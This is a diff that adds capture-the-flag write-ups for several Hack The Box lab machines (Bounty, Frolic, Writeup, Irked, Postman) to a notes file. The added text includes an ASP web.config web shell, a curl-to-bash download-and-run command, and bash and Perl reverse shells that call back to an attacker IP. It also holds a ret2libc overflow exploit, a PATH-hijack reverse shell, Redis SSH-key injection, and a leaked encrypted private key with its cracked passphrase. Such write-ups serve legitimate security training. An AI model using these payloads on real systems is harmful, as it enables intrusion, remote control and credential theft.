@@ -532,3 +532,504 @@ and searching for it we get this as our results :
 /usr/sbin/pppd
 ```
 and then just chekcing the emergency file its an executable lets try running it and guess what we get a root shell.
+
+# Windows : Bounty : 10.10.10.93 : Easy
+
+Nmap Results :
+
+```
+Nmap scan report for 10.10.10.93
+Host is up (0.055s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+```
+
+Going to the page we see that its just an image, so lets check source code and nnothing really  pops up lets try doing a simple dirbust and we can see that there is a file called  trasnfers.aspx and a directory called UploadedFiles.
+
+Uploading files on the page transfers.aspx we see that it denies us if we use extensions like aspx, etc.
+
+So lets try using a small lsit to check which extensions are allowed to uploaded and to do this we can use Burp's Intruder mode which will help us brute force some common extesnions and see what extension we can use to upload our reverse shell.
+
+Trying a simple list of extensions we see that the .config extension can be used to do this you can use a simple .config file that executes cmd commands via ASPX code i found this shell for .config files which gives us sort of a web shell.
+
+Code for the .CONFIG web shell
+
+```c#
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+         <handlers accessPolicy="Read, Script, Write">
+                  <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />                            
+      </handlers>
+            <security>                                                                                                                                                                                                                           
+         <requestFiltering>                                                                                                                                                                                                                
+            <fileExtensions>                                                                                                                                                                                                               
+               <remove fileExtension=".config" />                                                                                                                                                                                          
+            </fileExtensions>                                                                                                                                                                                                              
+            <hiddenSegments>                                                                                                                                                                                                               
+               <remove segment="web.config" />                                                                                                                                                                                             
+            </hiddenSegments>                                                                                                                                                                                                              
+         </requestFiltering>                                                                                                                                                                                                               
+      </security>                                                                                                                                                                                                                          
+   </system.webServer>                                                                                                                                                                                                                     
+   <appSettings>                                                                                                                                                                                                                           
+</appSettings>                                                                                                                                                                                                                             
+</configuration>
+<% Response.write("-"&"->") %>
+
+<%
+Set oScript = Server.CreateObject("WScript.Shell")
+Set oScriptNet = Server.CreateObject("WScript.Network")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%>
+
+<BODY>
+<FORM action="" method="GET">
+<input type="text" name="cmd" size=45 value="<%= szCMD %>">
+<input type="submit" value="Run">
+</FORM>
+
+<PRE>
+<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<% Response.Write(Request.ServerVariables("SERVER_NAME")) %>
+<p>
+<b>The server's local address:</b>
+</p>
+<p>
+<b>The server's port:</b>
+<% Response.Write(Request.ServerVariables("SERVER_PORT")) %>
+</p>
+<p>
+<b>The server's software:</b>
+<% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %>
+</p>
+<p>
+<b>Command output:</b>
+<%
+szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" & szCMD)
+Response.Write(thisDir)
+%>
+</p>
+<br>
+</BODY>
+
+<% Response.write("<!-"&"-") %>
+
+```
+and then to get a shell you can use a simple PS1 shell and then use 
+```
+msf5 post(multi/recon/local_exploit_suggester) > run
+[*] 10.10.10.93 - Collecting local exploits for x64/windows...
+[*] 10.10.10.93 - 17 exploit checks are being tried...
+[+] 10.10.10.93 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[*] Post module execution completed                                                              
+```
+Here using the exploit/windows/local/ms16_014_wmi_recv_notif we can use it to get a root shell.
+
+
+
+
+
+# Linux : Frolic : 10.10.10.111 : Easy
+
+Nmap Results :
+
+```
+Nmap scan report for 10.10.10.111
+Host is up (0.069s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
+|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
+|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1880/tcp open  http        Node.js (Express middleware)
+|_http-title: Node-RED
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+Now going to the NodeJS (Node-Red) we see there is a login page , and moving on to port 9999 we see a default nginx page but dirbusting it we get the following directories listed below but traversing to admin gives us another login page and checking the source code of that we see a js file , which lets us know what the password and username for this 
+
+
+and then we get redirected to success.html page where we get the following code :
+```bash
+..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
+..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
+....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
+..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
+!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
+..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
+?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
+..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
+..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
+!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
+!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
+.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
+!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
+?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
+!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
+!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
+!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
+..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
+!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
+!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
+..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
+..!.! !!!!! !.?.
+```
+This is a language called ook to decipher/decompile it we can now go to a website called : https://www.splitbrain.org/_static/ook/ and paste this in and press the button Ook to Text. we get the following text :
+
+```bash
+Nothing here check /asdiSIAJJ0QWE9JAS
+```
+
+going to this directory we see there is a base64 encoded command now lets copy it and paste it in a file and decode it which if you did in cyberchef we can see its a zip file :
+
+```bash
+echo -n "Base64 String" | base64 -d > out.zip 
+```
+unnzipping this we get a index.php file with yet another base64 string 
+
+```bash
+unzip out.zip
+```
+and then lets decode this and we get text in the language Brainfuck intrepreting that using https://www.splitbrain.org/_static/ook/ and this time brainfuck to text we get a password : idkwhatispass 
+
+Now checking the other directory we got on this port we see a dev directory adn within which there is another directory called backup going their we see the text /playsms which hints of existense of playsms website and that is the case indeed going to http://10.10.10.111:9999/playsms we see a login page and seeing this the first instinct should be to try the creds we just got in index.php : idkwhatispass with admin and it works and we cann use this exploit to gain RCE. 
+
+Exploit : https://github.com/jasperla/CVE-2017-9101
+
+We can git clone this repositries and we can use this to get a reverse shell :
+
+```bash
+python3 playsmshell.py --password idkwhatispass --url http://10.10.10.111:9999/playsms --command "curl 10.10.14.24:8000/yoyo.sh | bash"
+```
+and in this case the yoyo.sh file contains the following code :
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.24/8080 0>&1'
+```
+and we will get a shell back when we listen for it using nc -nvlp 8080 now we would be able to cat out the user.txt file and now ennumerating a little further using sutff like sudo -l and find / -perm -u=s -type f 2>/dev/null we see that there is an intresting binary called rop and transferring it over to our local machine using netcat and using it with gdb we can easily find that the EIP is writtable after 52 characters
+
+```bash
+$ ldd rop
+linux-gate.so.1 =>  (0xb7fda000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) # We use this one 
+/lib/ld-linux.so.2 (0xb7fdb000)
+
+```
+
+```bash
+$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh         
+ 15ba0b /bin/sh
+```
+
+```bash
+./rop $(python /dev/shm/exploit.py)
+```
+
+```bash                                                     
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10   
+   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0 # We gotta use this one 
+   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
+   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
+   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
+   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10   
+   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
+  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
+  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1  
+  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
+  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
+  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
+  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
+```
+
+```
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0   # We gotta use this one 
+   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE  
+   1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+```
+
+and our exploit is : 
+
+```python
+import struct 
+
+buf = "A" * 52
+libc =  0xb7e19000
+system = struct.pack('<I' , libc + 0x0003ada0)
+exit = struct.pack('<I', libc + 0x0002e9d0) 
+binsh = struct.pack('<I', libc + 0x0015ba0b ) 
+payload = buf + system + exit + binsh
+print payload
+
+```
+
+Then we can run the program 
+```
+./rop (python exploit.py)
+```
+and we will get our root shell back
+
+
+# Linux : Writeup : 10.10.10.138 : Easy
+
+Nmap Reuslts :
+```bash
+Nmap scan report for 10.10.10.138
+Host is up (0.049s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/writeup/
+|_http-title: Nothing here yet.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds
+```
+
+Now lets go to the website and ennumerate we are greeted to a baisc page made out of vi as they said but looking to our nmap scan annd also the robots.txt file we can see that there is a writeup/ directory which if you check the page source it gives us this information.
+
+```js
+<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+```
+
+And now searching the CMS Made Simple and this seems to be the version in 2019 so searching the CMS Made Simple 2019 exploit on google would redirect us to this exploit. 
+
+https://www.exploit-db.com/exploits/46635
+
+and for me the python2 versions are not the most stable exploits so i modified the print statements and added () to them and that helped me execute the exploit. And as a result we get this :
+```bash
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+```
+So now lets make a hash we can create a hash to crack : 
+```
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
+```
+we can now login to the ssh using jkr user
+
+Doinng some basic ennumeration i dont really find anything that useful leaving when we do 
+```
+id
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
+```
+and researching about these groups we find this 
+```bash
+jkr@writeup:/tmp$ echo '#!/bin/bash' > uname
+jkr@writeup:/tmp$ echo "bash -i >& /dev/tcp/10.10.16.131/4444 0>&1" >> uname
+jkr@writeup:/tmp$ chmod a+x uname 
+jkr@writeup:/tmp$ cp uname /usr/local/bin
+```
+
+# Linux : Irked : 10.10.10.117 : Easy
+
+Nmap Results :
+```
+Nmap scan report for 10.10.10.117
+Host is up (0.066s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
+|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          34454/udp   status
+|   100024  1          36719/tcp6  status
+|   100024  1          49640/udp6  status
+|_  100024  1          55131/tcp   status
+6697/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
+8067/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
+55131/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel1
+```
+
+```bash
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+```
+
+```bash
+sudo ltrace ./viewuser
+__libc_start_main(0x565d457d, 1, 0xfff32874, 0x565d4600 <unfinished ...>
+puts("This application is being devleo"...This application is being devleoped to set and test user permissions
+)                                                                                                      = 69
+puts("It is still being actively devel"...It is still being actively developed
+)                                                                                                      = 37
+system("who"kali     tty7         2021-02-03 11:45 (:0)
+kali     pts/2        2021-02-03 11:46 (tmux(3206).%0)
+kali     pts/3        2021-02-03 11:46 (tmux(3206).%1)
+kali     pts/4        2021-02-03 11:47 (tmux(3206).%2)
+kali     pts/6        2021-02-03 12:50 (tmux(3206).%3)
+kali     pts/7        2021-02-03 14:20 (tmux(3206).%4)
+kali     pts/8        2021-02-03 14:21 (tmux(3206).%5)
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                           = 0
+setuid(0)                                                                                                                                        = 0
+system("/tmp/listusers"sh: 1: /tmp/listusers: not found
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                           = 32512
++++ exited (status 0) +++
+
+```
+
+
+
+# Linux : Postman : 10.10.10.160 : Easy 
+
+### Nmap Results :
+```
+Nmap scan report for 10.10.10.160
+Host is up (0.072s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-server-header: MiniServ/1.910
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+Ennumerating Port 80 we can see a basic website that shows us a page that is in development but nothing really intresting pops out for me doing a dirbust on the website we see the following directories open, ennumerating them we still dont get any thing that intresting.
+
+Ennumerating port 10000 we can see there is Webmin which uses the hostname of Postman and we can edit our /etc/hosts file but it needs credentials which we dont have 
+
+Ennumerating Reddis, i dont really know how to ennuemrate reddis so lets look up an article and i foudn this one : https://book.hacktricks.xyz/pentesting/6379-pentesting-redis i tried the webshell exploit but didnt work but the ssh one seems to be possitive.
+
+```
+cat publickey | redis-cli -h 10.10.10.160 -x set ssh_key
+OK
+nickapic@alohaoy ~/htb/boxes/postman => redis-cli -h 10.10.10.160
+10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379>
+```
+
+Running Linpeas.sh we see 
+```bash
+[+] Backup files                                                                                                                                                                                                                             
+-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak 
+```
+Which if you cat out is the following maybe we can try logging in with this id_rsa as matt
+
+```bash
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+```
+
+Trying to login as Matt we see that there is a passphrase so lets try to crack it, using ssh2john.py and we get a passphrase after cracking that hash which is computer2008 .
+
+and trying to login to the system with the user matt and id_rsa key and entering the passphrase we get a connection reset lets try su user and also try it on webmin. 
+We dont find anything usefull in as the session as Matt, but loggin into webmin and looking for some authenticated exploits we come across this : https://github.com/wrighterase/webmin-1.910-authenticated-RCE
+
+For this exploit to work we have to base64 encode our perl reverse shell.
+
+```perl 
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+and then also url encode this you can use cyberchef for this and then run the exploit like this and a netcat reverse shell listner like listed below :
+
+```bash
+python2 webmin-1.910-authenticated-RCE.py -u Matt -x computer2008 -r 10.10.10.160 -p 10000
+rlwrap nc -nvlp 1234
+```
+
+and gg we get our root shell.
+
